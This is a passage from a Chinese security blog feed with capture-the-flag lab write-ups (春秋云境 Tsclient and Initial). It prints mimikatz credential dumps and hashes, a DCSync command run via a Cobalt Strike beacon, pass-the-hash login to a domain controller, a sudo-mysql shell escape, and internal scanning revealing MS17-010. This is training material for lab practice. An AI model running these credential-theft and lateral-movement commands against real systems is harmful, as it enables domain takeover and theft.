e3 b0 ea 2b 98 bd 54 b0 4c a3 86 93 c3 5f 2b 4f d3 ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 20488934 <span class="token punctuation">(</span>00000000:0138a2e6<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : DefaultAppPoolDomain            : IIS APPPOOLLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 17:25:50SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 62c2c5b11bdf4e29ff9f7df1eac74fad <span class="token operator">*</span> SHA1     : 86e6967523f223115510b4ce053a8eaf5de502f5tspkg :wdigest : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab <span class="token operator">*</span> Password : d5 f9 34 f3 81 31 6e ff e2 a4 1b 56 55 57 de 7c 99 af 71 a8 4f 26 06 d3 5f 2e ad 91 25 77 07 59 7a 6e 5a a3 b6 40 c7 cb 29 45 15 a7 3e 1e 7c d2 70 53 a9 db 4d 9b 0e 7b ed 94 84 f1 27 a5 37 f1 b7 a9 2d 8f 13 58 af f2 dd 83 9c 9e 5e 7e cd 3d 3e 5b 79 4a a3 9d 28 50 71 9b 3d 54 df f8 8e f6 eb d7 90 ad 52 fd d2 19 1a 8a 57 00 cc 75 32 76 84 16 a7 95 <span class="token function">fc</span> ad 2f f1 73 6b b8 3d a2 17 bb 0a 38 e0 26 26 b9 41 02 30 00 43 ab 62 00 48 44 <span class="token function">fc</span> 6d a2 e5 55 de e8 db ae 85 fa 11 af 63 92 52 ae db 3b ff d7 56 53 03 d1 37 16 5b bc 45 c0 cf 89 90 df 56 e3 b2 c5 ae 8f 56 32 76 77 71 ec 01 34 e7 49 eb 14 63 ff 5d 03 83 10 00 b8 ec 7b 71 a8 c9 d0 52 4a ab f3 aa 1f 00 7f a8 d9 ff ef 3e e3 b0 ea 2b 98 bd 54 b0 4c a3 86 93 c3 5f 2b 4f d3 ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 54897 <span class="token punctuation">(</span>00000000:0000d671<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 15:14:27SID               : S-1-5-90-0-1msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 62c2c5b11bdf4e29ff9f7df1eac74fad <span class="token operator">*</span> SHA1     : 86e6967523f223115510b4ce053a8eaf5de502f5tspkg :wdigest : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab <span class="token operator">*</span> Password : d5 f9 34 f3 81 31 6e ff e2 a4 1b 56 55 57 de 7c 99 af 71 a8 4f 26 06 d3 5f 2e ad 91 25 77 07 59 7a 6e 5a a3 b6 40 c7 cb 29 45 15 a7 3e 1e 7c d2 70 53 a9 db 4d 9b 0e 7b ed 94 84 f1 27 a5 37 f1 b7 a9 2d 8f 13 58 af f2 dd 83 9c 9e 5e 7e cd 3d 3e 5b 79 4a a3 9d 28 50 71 9b 3d 54 df f8 8e f6 eb d7 90 ad 52 fd d2 19 1a 8a 57 00 cc 75 32 76 84 16 a7 95 <span class="token function">fc</span> ad 2f f1 73 6b b8 3d a2 17 bb 0a 38 e0 26 26 b9 41 02 30 00 43 ab 62 00 48 44 <span class="token function">fc</span> 6d a2 e5 55 de e8 db ae 85 fa 11 af 63 92 52 ae db 3b ff d7 56 53 03 d1 37 16 5b bc 45 c0 cf 89 90 df 56 e3 b2 c5 ae 8f 56 32 76 77 71 ec 01 34 e7 49 eb 14 63 ff 5d 03 83 10 00 b8 ec 7b 71 a8 c9 d0 52 4a ab f3 aa 1f 00 7f a8 d9 ff ef 3e e3 b0 ea 2b 98 bd 54 b0 4c a3 86 93 c3 5f 2b 4f d3 ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 996 <span class="token punctuation">(</span>00000000:000003e4<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : WIN2016$Domain            : XIAORANGLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 15:14:27SID               : S-1-5-20msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 62c2c5b11bdf4e29ff9f7df1eac74fad <span class="token operator">*</span> SHA1     : 86e6967523f223115510b4ce053a8eaf5de502f5tspkg :wdigest : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : win2016$ <span class="token operator">*</span> Domain   : XIAORANG<span class="token punctuation">.</span>LAB <span class="token operator">*</span> Password : d5 f9 34 f3 81 31 6e ff e2 a4 1b 56 55 57 de 7c 99 af 71 a8 4f 26 06 d3 5f 2e ad 91 25 77 07 59 7a 6e 5a a3 b6 40 c7 cb 29 45 15 a7 3e 1e 7c d2 70 53 a9 db 4d 9b 0e 7b ed 94 84 f1 27 a5 37 f1 b7 a9 2d 8f 13 58 af f2 dd 83 9c 9e 5e 7e cd 3d 3e 5b 79 4a a3 9d 28 50 71 9b 3d 54 df f8 8e f6 eb d7 90 ad 52 fd d2 19 1a 8a 57 00 cc 75 32 76 84 16 a7 95 <span class="token function">fc</span> ad 2f f1 73 6b b8 3d a2 17 bb 0a 38 e0 26 26 b9 41 02 30 00 43 ab 62 00 48 44 <span class="token function">fc</span> 6d a2 e5 55 de e8 db ae 85 fa 11 af 63 92 52 ae db 3b ff d7 56 53 03 d1 37 16 5b bc 45 c0 cf 89 90 df 56 e3 b2 c5 ae 8f 56 32 76 77 71 ec 01 34 e7 49 eb 14 63 ff 5d 03 83 10 00 b8 ec 7b 71 a8 c9 d0 52 4a ab f3 aa 1f 00 7f a8 d9 ff ef 3e e3 b0 ea 2b 98 bd 54 b0 4c a3 86 93 c3 5f 2b 4f d3 ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 23364078 <span class="token punctuation">(</span>00000000:016481ee<span class="token punctuation">)</span>Session           : RemoteInteractive <span class="token keyword">from</span> 2User Name         : AldrichDomain            : XIAORANGLogon Server      : DC01Logon Time        : 2025/2/24 18:00:21SID               : S-1-5-21-3289074908-3315245560-3429321632-1105msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : Aldrich <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 3c42fe16daa873e60c5e9d0f966369e4 <span class="token operator">*</span> SHA1     : 6e8d5826a1024aeec1593471f4b2bd90487d677f <span class="token operator">*</span> DPAPI    : 7acb09c872ec5ed2315f33d1d1c837betspkg :wdigest : <span class="token operator">*</span> Username : Aldrich <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : Aldrich <span class="token operator">*</span> Domain   : XIAORANG<span class="token punctuation">.</span>LAB <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 23323067 <span class="token punctuation">(</span>00000000:0163e1bb<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 2User Name         : DWM-2Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 18:00:20SID               : S-1-5-90-0-2msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 62c2c5b11bdf4e29ff9f7df1eac74fad <span class="token operator">*</span> SHA1     : 86e6967523f223115510b4ce053a8eaf5de502f5tspkg :wdigest : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab <span class="token operator">*</span> Password : d5 f9 34 f3 81 31 6e ff e2 a4 1b 56 55 57 de 7c 99 af 71 a8 4f 26 06 d3 5f 2e ad 91 25 77 07 59 7a 6e 5a a3 b6 40 c7 cb 29 45 15 a7 3e 1e 7c d2 70 53 a9 db 4d 9b 0e 7b ed 94 84 f1 27 a5 37 f1 b7 a9 2d 8f 13 58 af f2 dd 83 9c 9e 5e 7e cd 3d 3e 5b 79 4a a3 9d 28 50 71 9b 3d 54 df f8 8e f6 eb d7 90 ad 52 fd d2 19 1a 8a 57 00 cc 75 32 76 84 16 a7 95 <span class="token function">fc</span> ad 2f f1 73 6b b8 3d a2 17 bb 0a 38 e0 26 26 b9 41 02 30 00 43 ab 62 00 48 44 <span class="token function">fc</span> 6d a2 e5 55 de e8 db ae 85 fa 11 af 63 92 52 ae db 3b ff d7 56 53 03 d1 37 16 5b bc 45 c0 cf 89 90 df 56 e3 b2 c5 ae 8f 56 32 76 77 71 ec 01 34 e7 49 eb 14 63 ff 5d 03 83 10 00 b8 ec 7b 71 a8 c9 d0 52 4a ab f3 aa 1f 00 7f a8 d9 ff ef 3e e3 b0 ea 2b 98 bd 54 b0 4c a3 86 93 c3 5f 2b 4f d3 ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 995 <span class="token punctuation">(</span>00000000:000003e3<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : IUSRDomain            : NT AUTHORITYLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 15:14:30SID               : S-1-5-17msv :tspkg :wdigest : <span class="token operator">*</span> Username : <span class="token punctuation">(</span>null<span class="token punctuation">)</span> <span class="token operator">*</span> Domain   : <span class="token punctuation">(</span>null<span class="token punctuation">)</span> <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos :ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 997 <span class="token punctuation">(</span>00000000:000003e5<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 15:14:27SID               : S-1-5-19msv :tspkg :wdigest : <span class="token operator">*</span> Username : <span class="token punctuation">(</span>null<span class="token punctuation">)</span> <span class="token operator">*</span> Domain   : <span class="token punctuation">(</span>null<span class="token punctuation">)</span> <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : <span class="token punctuation">(</span>null<span class="token punctuation">)</span> <span class="token operator">*</span> Domain   : <span class="token punctuation">(</span>null<span class="token punctuation">)</span> <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 54928 <span class="token punctuation">(</span>00000000:0000d690<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 15:14:27SID               : S-1-5-90-0-1msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a <span class="token operator">*</span> SHA1     : e06238ecefc14d675f762b08a456770dc000f763tspkg :wdigest : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab <span class="token operator">*</span> Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc <span class="token function">ac</span> 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 <span class="token function">fc</span> 81 96 <span class="token function">ac</span> c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 25152 <span class="token punctuation">(</span>00000000:00006240<span class="token punctuation">)</span>Session           : UndefinedLogonType <span class="token keyword">from</span> 0User Name         : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Domain            : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 15:14:26SID               : msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 62c2c5b11bdf4e29ff9f7df1eac74fad <span class="token operator">*</span> SHA1     : 86e6967523f223115510b4ce053a8eaf5de502f5tspkg :wdigest :kerberos :ssp :credman :Authentication Id : 0 <span class="token punctuation">;</span> 999 <span class="token punctuation">(</span>00000000:000003e7<span class="token punctuation">)</span>Session           : UndefinedLogonType <span class="token keyword">from</span> 0User Name         : WIN2016$Domain            : XIAORANGLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 15:14:26SID               : S-1-5-18msv :tspkg :wdigest : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : win2016$ <span class="token operator">*</span> Domain   : XIAORANG<span class="token punctuation">.</span>LAB <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>ssp :credman :<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224215934014.png" alt="image-20250224215934014"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224220011050.png" alt="image-20250224220011050"></p><p>发现 win2016$ 在域管理员组里，即机器账户可以 Hash 传递登录域控</p><p>先传 mimikatz.exe </p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell C:\Users\Aldrich\Desktop\mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /csv"</span> <span class="token keyword">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell C:\Users\Aldrich\Desktop\mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /csv"</span> <span class="token keyword">exit</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: C:\Users\Aldrich\Desktop\mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /csv"</span> <span class="token keyword">exit</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 122 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:  <span class="token punctuation">.</span><span class="token comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span> <span class="token punctuation">.</span><span class="token comment">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span> <span class="token comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span> <span class="token comment">## \ / ##       > https://blog.gentilkiwi.com/mimikatz</span> <span class="token string">'## v ##'</span>       Vincent LE TOUX             <span class="token punctuation">(</span> vincent<span class="token punctuation">.</span>letoux@gmail<span class="token punctuation">.</span>com <span class="token punctuation">)</span>  <span class="token string">'#####'</span>        > https:<span class="token operator">/</span><span class="token operator">/</span>pingcastle<span class="token punctuation">.</span>com <span class="token operator">/</span> https:<span class="token operator">/</span><span class="token operator">/</span>mysmartlogon<span class="token punctuation">.</span>com <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">/</span>mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span><span class="token namespace">[DC]</span> <span class="token string">'xiaorang.lab'</span> will be the domain<span class="token namespace">[DC]</span> <span class="token string">'DC01.xiaorang.lab'</span> will be the DC server<span class="token namespace">[DC]</span> Exporting domain <span class="token string">'xiaorang.lab'</span><span class="token namespace">[rpc]</span> Service  : ldap<span class="token namespace">[rpc]</span> AuthnSvc : GSS_NEGOTIATE <span class="token punctuation">(</span>9<span class="token punctuation">)</span>502krbtgt3ffd5b58b4a6328659a606c3ea6f9b635141000DC01$9a475fed0a8647c9d4f3368b99658279532480500Administrator2c9d81bdcf3ec8b1def10328a7cc2f085121103WIN2016$62c2c5b11bdf4e29ff9f7df1eac74fad167813121104WIN19-CLIENT$f68954ac590e18582d6e75ae0917c954167813121105Aldrich3c42fe16daa873e60c5e9d0f966369e4512mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># exit</span>Bye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>PS：CS4.2集成了 dumphash 和 mimikataz，可以直接用</p><p>然后哈希传递登录域控</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains python3 smbexec.py <span class="token parameter variable">-hashes</span> :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 <span class="token parameter variable">-codec</span> gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224222158188.png" alt="image-20250224222158188"></p><p>flag03: <code>flag&#123;14ccf52e-b30c-4553-98f5-bbf93c7c88fa&#125;</code></p><p>学到好多东西</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/&quot;&gt;https://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bowuchuling.github.io/posts/chunqiu_Tsclient&quot;&gt;https://bowuchuling.github.io/posts/chunqiu_Tsclient&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/&quot;&gt;https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>春秋云境 Initial</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/</id>
    <published>2025-02-24T02:55:20.000Z</published>
    <updated>2025-02-25T09:08:24.309Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感谢 <a href="https://dexterjie.github.io/">@Dexterjie</a> 快过期的沙砾支持</p><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/">https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/</a></p><span id="more"></span><hr><h1 id="thinkphp-5-0-23-RCE"><a href="#thinkphp-5-0-23-RCE" class="headerlink" title="thinkphp 5.0.23 RCE"></a>thinkphp 5.0.23 RCE</h1><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224113527285.png" alt="image-20250224113527285"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224113814420.png" alt="image-20250224113814420"></p><p>这么大一个tp的标，直接开扫</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114119033.png" alt="image-20250224114119033"></p><p>getshell 完直接蚁剑连上去</p><hr><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先看下 suid 权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114409155.png" alt="image-20250224114409155"></p><p>没啥可利用的，看一下 sudo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114454204.png" alt="image-20250224114454204"></p><p>那么就是 mysql 提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! /bin/sh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224114659322.png" alt="image-20250224114659322"></p><p>拿到第一段flag：<code>flag&#123;60b53231-</code></p><hr><h1 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h1><p>接下来打内网，ifconfig 看一下内网网段，传 fscan 给执行权限扫内网</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! chmod 777 ./fscan'</span><span class="token function">ifconfig</span>./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.1.15/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224115304032.png" alt="image-20250224115304032"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.1.18:445 <span class="token function">open</span><span class="token number">172.22</span>.1.18:3306 <span class="token function">open</span><span class="token number">172.22</span>.1.21:445 <span class="token function">open</span><span class="token number">172.22</span>.1.2:445 <span class="token function">open</span><span class="token number">172.22</span>.1.18:139 <span class="token function">open</span><span class="token number">172.22</span>.1.2:139 <span class="token function">open</span><span class="token number">172.22</span>.1.21:139 <span class="token function">open</span><span class="token number">172.22</span>.1.18:135 <span class="token function">open</span><span class="token number">172.22</span>.1.21:135 <span class="token function">open</span><span class="token number">172.22</span>.1.2:135 <span class="token function">open</span><span class="token number">172.22</span>.1.18:80 <span class="token function">open</span><span class="token number">172.22</span>.1.15:80 <span class="token function">open</span><span class="token number">172.22</span>.1.2:88 <span class="token function">open</span><span class="token number">172.22</span>.1.15:22 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.1.18   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>XIAORANG-OA01   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.1.18<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.1.2   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>DC01   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.1.2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.1.21   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>XIAORANG-WIN7   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.1.21<span class="token punctuation">[</span>+<span class="token punctuation">]</span> MS17-010 <span class="token number">172.22</span>.1.21    <span class="token punctuation">(</span>Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> 